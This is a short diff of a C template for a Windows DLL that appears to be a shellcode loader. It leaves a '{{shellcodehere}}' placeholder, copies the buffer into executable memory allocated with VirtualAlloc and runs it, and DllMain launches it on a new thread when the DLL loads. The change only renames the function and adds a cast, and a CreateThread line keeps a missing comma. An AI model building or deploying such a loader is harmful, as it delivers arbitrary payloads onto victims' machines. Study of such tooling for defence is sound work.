@@ -11,13 +11,12 @@
 
 {{shellcodehere}}
 
-DWORD WINAPI EXEC()
+void ExecuteShellcode()
 {
 	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, buf, sizeof(buf));
 	((void(*)())exec)();
 }
-
 extern HINSTANCE hAppInstance;
 //===============================================================================================//
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
@@ -31,7 +30,7 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 			break;
 		case DLL_PROCESS_ATTACH:
 			hAppInstance = hinstDLL;
-			CreateThread(NULL , 0, EXEC, NULL, 0 NULL);
+			CreateThread(NULL , 0, (LPTHREAD_START_ROUTINE)ExecuteShellcode, NULL, 0 NULL);
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
